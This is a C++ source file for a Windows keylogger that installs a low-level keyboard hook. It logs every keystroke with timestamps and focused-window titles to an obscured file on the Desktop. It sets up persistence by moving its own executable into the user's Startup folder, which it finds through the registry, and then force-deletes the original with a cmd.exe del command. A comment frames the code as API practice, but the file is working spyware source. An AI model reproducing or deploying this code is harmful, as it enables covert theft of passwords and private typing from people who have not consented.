#include "LowLevelKeyboardHook.h"
#include "Common.h"
#include "shlobj_core.h"
#include <Strsafe.h>

// return non-zero if the key pressed
static BOOL keyIsPressed(int vKey) {
    return (GetAsyncKeyState(vKey) & 0x8000) > 0;
}

// return true if a key is toggled (like CapsLock on)
static BOOL keyIsToggled(int vKey) {
    return GetKeyState(vKey) & 0x1;
}

// convert SystemTime to Unix time (in mili seconds)
static UINT64 systemTimeToMseconds(SYSTEMTIME& sysTime) {
    FILETIME cFileTime; //  the number of 100-nanosecond intervals
    if (!SystemTimeToFileTime(&sysTime, &cFileTime)) {
        return -1;
    }
    UINT64 mseconds = 0;
    memcpy(&mseconds, &cFileTime, sizeof(UINT64));
    mseconds /= 10000;

    return mseconds;
}

// return 1 if timeout, 0 if not and -1 if errors
static int sessionTimeout(SYSTEMTIME& sysTime) {
    UINT64 mseconds = systemTimeToMseconds(sysTime);
    if (lastSessionAt == 0 || (mseconds - lastSessionAt > sessionInterval)) {
        lastSessionAt = mseconds;
        return 1;
    }
    return 0;
}

// write typing keystrokes to a file
// cases to end a session (1. focus window changed, 2. timeout)
void logKey(wchar_t const* format, ...) {
    va_list vl;
    SYSTEMTIME sysTime;
    HWND hWnd = NULL;
    GUITHREADINFO tInfo = { sizeof(tInfo) };
    wchar_t buffer[BUFSIZE] = {};
    wchar_t cTimeBuf[BUFSIZE] = {};
    wchar_t wTitleBuf[BUFSIZE] = {};

    if (GetGUIThreadInfo(NULL, &tInfo)) {
        hWnd = tInfo.hwndFocus;
    }

    // format [time][window-focus] keystrokes
    GetSystemTime(&sysTime);
    if (lastSessionAt == NULL) {
        lastSessionAt = systemTimeToMseconds(sysTime);
    }

    if (lastHWnd == NULL || (hWnd != lastHWnd) || (sessionTimeout(sysTime))) {

        if (hWnd != NULL) {
            GetWindowText(hWnd, wTitleBuf, BUFSIZE);
        }
        int nwrite = GetDateFormatEx(LOCALE_NAME_SYSTEM_DEFAULT, NULL, &sysTime, NULL, cTimeBuf, BUFSIZE, NULL);
        cTimeBuf[nwrite - 1] = ' ';
        GetTimeFormatEx(LOCALE_NAME_SYSTEM_DEFAULT, NULL, &sysTime, NULL, &cTimeBuf[nwrite], BUFSIZE - nwrite);

        swprintf(buffer, BUFSIZE, L"\n[%s][%s] ", cTimeBuf, wTitleBuf);
        buffer[wcslen(buffer)] = L' ';
    }
    lastHWnd = hWnd;

    va_start(vl, format);
    vswprintf_s(buffer + wcslen(buffer), BUFSIZE - wcslen(buffer), format, vl);
    wprintf(buffer);

    DWORD nwrite = 0;
    char ansiBuf[BUFSIZE] = {};
    if (hLogFile != NULL) {
        nwrite = WideCharToMultiByte(CP_UTF8, 0, buffer, wcslen(buffer), ansiBuf, BUFSIZE, NULL, NULL);
        memfrob_like(ansiBuf, nwrite);
        WriteFile(hLogFile, ansiBuf, nwrite, &nwrite, NULL);
        FlushFileBuffers(hLogFile);
    }
    va_end(vl);
}

int logKeyWrapper(int vkCode) {
    if (vkeyToChars.find(vkCode) != vkeyToChars.end()) {    // special chars
        logKey(L"[%s]", vkeyToChars.at(vkCode));
        return 0;
    }

    BOOL isCapsLock = keyIsToggled(VK_CAPITAL);
    BOOL isShift = keyIsPressed(VK_SHIFT);

    if (isShift && (shiftKeyToChars.find(vkCode) != shiftKeyToChars.end())) {    // Shift+convertable_key
        logKey(L"%s", shiftKeyToChars.at(vkCode));
        return 0;
    }

    // limitation: not taking into account the state of the SHIFT and CAPS LOCK keys (just individuals)
    // even does ToUnicode which takes the current virutal keystate
    wchar_t vkChar = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
    if (vkChar != 0) {
        if ((isCapsLock ^ isShift) == 0) {
            vkChar = tolower(vkChar);
        }
        logKey(L"%c", vkChar);
    }
    return 0; // non-zero values prevent from passing to the next in the chain or the target window proc
}

LRESULT CALLBACK keyloggerProc(
    int    nCode,
    WPARAM wParam,
    LPARAM lParam
) {
    KBDLLHOOKSTRUCT* pHookInfo = (KBDLLHOOKSTRUCT*)lParam;

    // only process non-system keys pressed 
    if (nCode != 0 || wParam != WM_KEYDOWN) {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    if (keyIsPressed(VK_MENU) || keyIsPressed(VK_CONTROL) || wParam == VK_SHIFT) {  // ignore Alt/Ctrl + otherKey || Shift key
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    return logKeyWrapper(pHookInfo->vkCode);
}

// initialize log file and its environment
void initLogFile() {
    PWSTR tempLogPath;
    int ret = 0;

    // init logPath
    ret = SHGetKnownFolderPath(FOLDERID_Desktop, KF_FLAG_CREATE, NULL, &tempLogPath);
    if (ret == S_OK) {
        wcscpy_s(logPath, tempLogPath);
        wcscat_s(logPath, L"\\keylogger.txt");
        CoTaskMemFree(tempLogPath);
    }
    // init hLogFile
    hLogFile = CreateFile(logPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLogFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_EXISTS) {  // append
        hLogFile = CreateFile(logPath, FILE_WRITE_DATA | FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        SetFilePointer(hLogFile, 0, NULL, FILE_END);
    }
}

wchar_t delCmdFormat[BUFSIZE] = L"cmd.exe /C del /F \"%s\"";
// forced delete a file
BOOL deleteFile(wchar_t const* filepath) {
    wchar_t delCmd[BUFSIZE];

    STARTUPINFO sInfo;
    PROCESS_INFORMATION pInfo;
    ZeroMemory(&sInfo, sizeof(STARTUPINFO));
    ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));

    DeleteFile(filepath);
    // in case of ERROR_ACCESS_DENIED
    if (StringCchPrintf(delCmd, BUFSIZE, delCmdFormat, filepath) != S_OK) {
        return FALSE;
    }

    wprintf(L"%s\n", filepath);
    wprintf(L"%s\n", delCmd);

    if (!CreateProcess(NULL, delCmd,
        NULL, NULL, FALSE, 0, NULL, NULL, &sInfo, &pInfo)) {
        return FALSE;
    }
    return TRUE;
}

// startup folder (redundency for practicing registry key APIs)
void doPersistence() {
    // registry
    HKEY hShellFolderKey = NULL;
    DWORD size = BUFSIZE;
    BYTE startupPath[BUFSIZE] = {};
    BOOL retry = 0;
    wchar_t* pStartupPath = NULL;
    wchar_t expanded[BUFSIZE] = {};

    // module file name
    wchar_t modulePath[BUFSIZE] = {};
    int ret = 0;

    // get startup folder path
    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
        0, KEY_READ, &hShellFolderKey)) {
        return;
    }
    if ((ret = RegQueryValueEx(hShellFolderKey, L"Startup", NULL, NULL, startupPath, &size)) > 0 && ret != ERROR_MORE_DATA) {
        return;
    }
    if (ret == ERROR_MORE_DATA) {   // retry
        pStartupPath = (wchar_t*)malloc(size + 1);
        if (pStartupPath == NULL) {
            return;
        }
        if ((ret = RegQueryValueEx(hShellFolderKey, L"Startup", NULL, NULL, (BYTE*)pStartupPath, &size)) > 0) {
            return;
        }
        retry = 1;
    }

    if (pStartupPath == NULL) {
        pStartupPath = (wchar_t*)startupPath;
    }
    // expand envs if having
    ExpandEnvironmentStrings(pStartupPath, expanded, BUFSIZE - 1);
    int preLen = wcslen(expanded);

    // move module file
    GetModuleFileName(NULL, modulePath, BUFSIZE);

    // if already in startup folder
    if (wcslen(modulePath) > wcslen(expanded) && wcsncmp(modulePath, expanded, wcslen(expanded))==0) {
        return;
    }

    int slashAt = wcslen(modulePath) - 1;
    while (slashAt>=0 && modulePath[slashAt] != L'\\') {
        slashAt -= 1;
    }
    if (slashAt < 0) {
        slashAt = 0;
    }

    wcscat_s(expanded, &modulePath[slashAt]);
    MoveFile(modulePath, expanded);
    deleteFile(modulePath);

    if (retry) {
        free(pStartupPath);
    }
    RegCloseKey(hShellFolderKey);
}

// an keylogging approach using SetWindowsHookEx with WH_KEYBOARD_LL type
int usingLowLevelKeyboardHook() {

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyloggerProc, GetModuleHandle(NULL), 0);
    if (hHook == NULL) {
        printError("cannot hook keyboard events");
        return 1;
    }
    doPersistence();
    initLogFile();

    // WH_KEYBOARD_LL: the message loop is necessary for WH_KEYBOARD_LL due to hooked messages sent the the thread installed the hook
    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}